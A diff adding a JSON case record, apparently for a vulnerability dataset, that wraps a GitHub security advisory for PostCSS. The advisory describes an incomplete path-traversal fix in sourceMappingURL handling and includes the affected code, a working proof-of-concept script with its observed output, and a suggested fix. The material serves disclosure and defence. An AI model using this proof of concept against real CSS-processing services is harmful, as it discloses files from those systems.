@@ -1,0 +1,172 @@
+{
+  "adjudication": {
+    "admission_output_used": false,
+    "basis": "source_observation",
+    "corpus_v1_evidence_used": false,
+    "corpus_v1_labels_used": false,
+    "corpus_v1_scores_used": false,
+    "detector_output_used": false,
+    "expected_condition_signals": [],
+    "notes": "Partial public-source metadata only; intentionally insufficient as a positive condition.",
+    "ranking_output_used": false,
+    "v6_first_blind_case_errors_used": false,
+    "v6_first_blind_score_used": false
+  },
+  "capture_method": "passive_source_snapshot",
+  "capture_reference": "https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp",
+  "captured_at": "2026-08-14T18:58:04.420184+00:00",
+  "case_kind": "sparse_noisy",
+  "collector": {
+    "kind": "v7_public_source_literal_draft",
+    "target_contact_performed": false,
+    "third_party_code_executed": false,
+    "version": "1.0.0"
+  },
+  "family": "source_map_exposure",
+  "raw": {
+    "details": {
+      "observation_kind": "partial_public_source_metadata",
+      "source_project": "postcss/postcss",
+      "version_boundaries": [
+        {
+          "ecosystem": "npm",
+          "package": "postcss",
+          "patched_version": "8.5.23",
+          "vulnerable_version_range": "<= 8.5.22"
+        }
+      ],
+      "version_boundary_count": 1
+    },
+    "method": "UNKNOWN"
+  },
+  "source_project": "postcss/postcss",
+  "source_root": "GHSA-fxqj-rqcc-2cmp",
+  "source_snapshot": {
+    "payload": {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "anir0y",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/29829469?v=4",
+            "events_url": "https://api.github.com/users/anir0y/events{/privacy}",
+            "followers_url": "https://api.github.com/users/anir0y/followers",
+            "following_url": "https://api.github.com/users/anir0y/following{/other_user}",
+            "gists_url": "https://api.github.com/users/anir0y/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/anir0y",
+            "id": 29829469,
+            "login": "anir0y",
+            "node_id": "MDQ6VXNlcjI5ODI5NDY5",
+            "organizations_url": "https://api.github.com/users/anir0y/orgs",
+            "received_events_url": "https://api.github.com/users/anir0y/received_events",
+            "repos_url": "https://api.github.com/users/anir0y/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/anir0y/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/anir0y/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/anir0y",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-69153",
+      "cvss": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": null,
+          "vector_string": null
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        },
+        {
+          "cwe_id": "CWE-200",
+          "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+        }
+      ],
+      "description": "## Summary\r\n\r\nThe fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.\r\n\r\n`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.\r\n\r\n## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)\r\n\r\n```js\r\n// lib/previous-map.js\r\nloadFile(path, cssFile, trusted) {\r\n  if (!trusted && !this.unsafeMap) {\r\n    if (!/\\.map$/i.test(path)) {\r\n      return undefined\r\n    }\r\n    if (cssFile) {                       // guard runs ONLY when `from` is set\r\n      let relativePath = relative(dirname(cssFile), path)\r\n      if (relativePath === '..' ||\r\n          relativePath.startsWith('..' + sep) ||\r\n          isAbsolute(relativePath)) {\r\n        return undefined\r\n      }\r\n    }\r\n  }\r\n  this.root = dirname(path)\r\n  if (existsSync(path)) {\r\n    this.mapFile = path\r\n    return readFileSync(path, 'utf-8').toString().trim()   // sink\r\n  }\r\n}\r\n\r\n// loadMap(): untrusted annotation path, trusted=false; file === opts.from\r\n} else if (this.annotation) {\r\n  let map = this.annotation\r\n  if (file) map = join(dirname(file), map)   // no `from` -> map stays the raw URL\r\n  let unknown = this.loadFile(map, file, false)  // file undefined -> cssFile falsy\r\n```\r\n\r\n## Proof of concept (verified on postcss 8.5.22)\r\n\r\n```js\r\nconst postcss = require('postcss')\r\nconst fs = require('fs')\r\n\r\n// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)\r\nconst secret = '/tmp/pcpoc/secret_out_of_tree.map'\r\nfs.writeFileSync(secret, JSON.stringify({\r\n  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],\r\n  sourcesContent: ['TOP_SECRET_abcdef']\r\n}))\r\n\r\nconst css = 'a{color:red}\\n/*# sourceMappingURL=' + secret + ' */'\r\nconst leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')\r\n\r\n;(async () => {\r\n  // A) NO `from`  -> guard skipped -> arbitrary absolute .map read + disclosed\r\n  const a = await postcss([]).process(css, { map: true })\r\n  console.log('no from   -> leaked:', !!leaks(a.map))   // true\r\n\r\n  // B) WITH `from` -> guard active -> blocked\r\n  const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })\r\n  console.log('with from -> leaked:', !!leaks(b.map))    // false\r\n})()\r\n```\r\n\r\nObserved output on postcss 8.5.22:\r\n\r\n```\r\nno from   -> leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map\r\nwith from -> leaked: false     # guard rejects the absolute path\r\n```\r\n\r\n`../` traversal (no `from`) also succeeds; non-`.map` targets (`.txt`, `?x=.map`, `#.map`) are blocked by the `.map` check. The tested build contains the GHSA-6g55 fix (`this.json = JSON.parse(...)` in `loadMap`, `consumer()` uses `this.json || this.text`), so this is a residual of that fix.\r\n\r\n## Impact\r\n\r\nArbitrary `.map`-file read (absolute path or `../` traversal) and disclosure of the target map's `sources` (local filesystem paths) and `sourcesContent` (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a `from` option and exposes `result.map` (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in `.map` that parse as JSON.\r\n\r\n## Suggested fix\r\n\r\nApply the traversal/absolute-path rejection to the untrusted map path regardless of whether `cssFile` is present (resolve against `process.cwd()` when there is no `cssFile`, and reject absolute paths and `..` escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.",
+      "ghsa_id": "GHSA-fxqj-rqcc-2cmp",
+      "html_url": "https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-fxqj-rqcc-2cmp"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-69153"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-07-24T17:06:11Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/19343?v=4",
+        "events_url": "https://api.github.com/users/ai/events{/privacy}",
+        "followers_url": "https://api.github.com/users/ai/followers",
+        "following_url": "https://api.github.com/users/ai/following{/other_user}",
+        "gists_url": "https://api.github.com/users/ai/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/ai",
+        "id": 19343,
+        "login": "ai",
+        "node_id": "MDQ6VXNlcjE5MzQz",
+        "organizations_url": "https://api.github.com/users/ai/orgs",
+        "received_events_url": "https://api.github.com/users/ai/received_events",
+        "repos_url": "https://api.github.com/users/ai/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/ai/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/ai/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/ai",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset",
+      "updated_at": "2026-08-03T16:44:22Z",
+      "url": "https://api.github.com/repos/postcss/postcss/security-advisories/GHSA-fxqj-rqcc-2cmp",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "postcss"
+          },
+          "patched_versions": "8.5.23",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "<= 8.5.22"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    "reference": "https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp",
+    "retrieved_at": "2026-08-14T18:58:04.420189+00:00",
+    "snapshot_role": "canonical_source"
+  }
+}
